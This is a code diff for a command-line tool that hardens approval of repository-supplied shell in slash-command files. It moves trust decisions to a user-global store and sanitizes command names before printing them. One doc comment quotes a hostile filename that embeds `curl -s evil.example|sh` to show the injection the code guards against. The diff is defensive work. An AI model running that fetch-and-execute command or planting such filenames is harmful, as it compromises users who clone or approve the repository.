@@ -10,9 +10,13 @@
  * reaches the same shell without a terminal to warn anyone.
  *
  * Project command files consequently need the one-time decision an `.mcp.json`
- * server already needs, recorded in `.book/settings.local.json` under
- * `commands.projectCommands`. That file is gitignored and the repository layer
- * is forbidden from writing the key, so the gated party cannot self-approve.
+ * server already needs. It is recorded outside the workspace, in
+ * `<BOOK_HOME>/trust.json` keyed by workspace path, for the reason the other
+ * three gated classes moved there: `.gitignore` does not stop a *tracked* file
+ * from reaching a clone, so a repository that force-adds
+ * `.book/settings.local.json` would otherwise ship its own approvals and arrive
+ * pre-trusted. Both workspace settings layers are stripped of the key, so
+ * nothing the gated party writes can answer for it.
  *
  * The fingerprint covers the extracted shell, not the whole body: editing what
  * runs invalidates the decision, editing the surrounding prose does not. Prose
@@ -25,11 +29,10 @@
  * approve and is never gated either.
  */
 import { createHash } from 'crypto';
-import { join } from 'path';
 import { extractShellInjections } from './commands/shell-injection.js';
-import { formatSettingsDiagnostics, SettingsRepository } from './settings-repository.js';
 import type { CommandSettings, ProjectCommandChoice } from './settings.js';
 import type { SlashCommand } from './types/commands.js';
+import { updateWorkspaceTrust } from './workspace-trust.js';
 
 /** Recorded decisions, keyed by command name. */
 export type ProjectCommandStore = Record<string, ProjectCommandChoice>;
@@ -135,25 +138,68 @@ function displayable(command: string): string {
     : flattened;
 }
 
+/**
+ * A command's name is the filename the repository chose, so it is untrusted
+ * text on the same footing as the body. Prose renders it stripped of anything
+ * that could repaint the refusal the user is being asked to judge.
+ */
+export function displayableCommandName(name: string): string {
+  return displayable(name);
+}
+
+/**
+ * The name only when it is safe to hand someone as a shell word.
+ *
+ * A refusal prints a `book trust command <name>` line for the user to paste
+ * into their own shell, and the name reaching it came from the gated party. A
+ * repository shipping ``.book/commands/deploy`curl -s evil.example|sh`.md``
+ * would otherwise have its payload executed by the very act of approving —
+ * quoting is not enough, because the name is also what the user reads to
+ * decide. Anything outside a plain filename returns null and the caller prints
+ * no paste-ready line at all.
+ */
+export function shellSafeCommandName(name: string): string | null {
+  return /^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(name) ? name : null;
+}
+
+/**
+ * The shell a body substitutes, rendered for a terminal, one line per command.
+ *
+ * Approving a command approves this, so any surface that offers the decision
+ * has to be able to show it — `book doctor` listing what is withheld, and
+ * `book trust command --all-pending`, which would otherwise grant a list of
+ * names. Truncation is reported rather than hidden.
+ */
+export function describeProjectCommandShell(command: SlashCommand): string[] {
+  const injections = extractShellInjections(command.body);
+  const listed = injections.slice(0, MAX_LISTED_COMMANDS);
+  return [
+    ...listed.map((injection) => `$ ${displayable(injection.command)}`),
+    ...(injections.length > listed.length
+      ? [`…and ${injections.length - listed.length} more — read the file before approving`]
+      : []),
+  ];
+}
+
 export function describeProjectCommandApproval(
   command: SlashCommand,
   state: 'unknown' | 'rejected',
 ): string {
   const injections = extractShellInjections(command.body);
-  const fingerprint = projectCommandFingerprint(command.body);
   const listed = injections.slice(0, MAX_LISTED_COMMANDS);
+  const shown = displayableCommandName(command.name);
+  const safeName = shellSafeCommandName(command.name);
   // Approving from a truncated view is approving what you did not read, so
   // an abbreviated listing says so and names the file to read instead.
   const abbreviated =
     injections.length > listed.length ||
     listed.some((injection) => displayable(injection.command) !== injection.command);
-  const decision = JSON.stringify({ [command.name]: { fingerprint, choice: 'approved' } });
   return [
     state === 'rejected'
-      ? `/${command.name} substitutes shell you rejected.`
-      : `/${command.name} substitutes shell that has not been approved.`,
+      ? `/${shown} substitutes shell you rejected.`
+      : `/${shown} substitutes shell that has not been approved.`,
     '',
-    `  .book/commands/${command.name}.md runs ${injections.length} shell command${
+    `  .book/commands/${shown}.md runs ${injections.length} shell command${
       injections.length === 1 ? '' : 's'
     } to build its prompt.`,
     '  That happens before the model sees anything, outside the permission system',
@@ -164,13 +210,21 @@ export function describeProjectCommandApproval(
       ? [`    …and ${injections.length - listed.length} more`]
       : []),
     '',
-    `  Approve with: book config set commands.projectCommands '${decision}'`,
-    '  Reject it by recording "rejected" instead of "approved".',
-    '  Editing what the command runs asks again.',
+    ...(safeName
+      ? [
+          `  Approve with: book trust command ${safeName}`,
+          `  Refuse it with: book trust command ${safeName} --reject`,
+          '  Run it from the project, or pass --workspace. Editing what the command runs asks again.',
+        ]
+      : [
+          '  This command’s file name is not a plain name, so no command to paste is offered:',
+          '  a name is a filename the repository chose, and pasting one can run what it contains.',
+          '  Rename the file, or decide it with `book trust command --all-pending`.',
+        ]),
     ...(abbreviated
       ? [
           `  Not shown verbatim (abbreviated, or unsafe characters stripped) — read`,
-          `  .book/commands/${command.name}.md in full before approving.`,
+          `  .book/commands/${shown}.md in full before approving.`,
         ]
       : []),
   ].join('\n');
@@ -197,23 +251,19 @@ export function assertProjectCommandApproved(
   );
 }
 
-/** Record an approve/reject decision in the project-local settings layer. */
+/** Record an approve/reject decision in the user-global trust store. */
 export function persistProjectCommandChoice(
   workspace: string,
   name: string,
   fingerprint: string,
   choice: ProjectCommandChoice['choice'],
+  options: { trustStorePath?: string } = {},
 ): { ok: boolean; error?: string } {
-  const path = join(workspace, '.book', 'settings.local.json');
-  const result = new SettingsRepository(path).update((candidate) => {
-    const commands = (candidate.commands ??= {}) as Record<string, unknown>;
-    if (typeof commands !== 'object' || Array.isArray(commands)) {
-      throw new Error('settings.local.json "commands" must be an object');
-    }
-    const projectCommands = (commands.projectCommands ??= {}) as Record<string, unknown>;
-    projectCommands[name] = { fingerprint, choice } satisfies ProjectCommandChoice;
-  });
-  return result.ok
-    ? { ok: true }
-    : { ok: false, error: formatSettingsDiagnostics(result.diagnostics) };
+  return updateWorkspaceTrust(
+    workspace,
+    (trust) => {
+      trust.projectCommands[name] = { fingerprint, choice };
+    },
+    options.trustStorePath,
+  );
 }
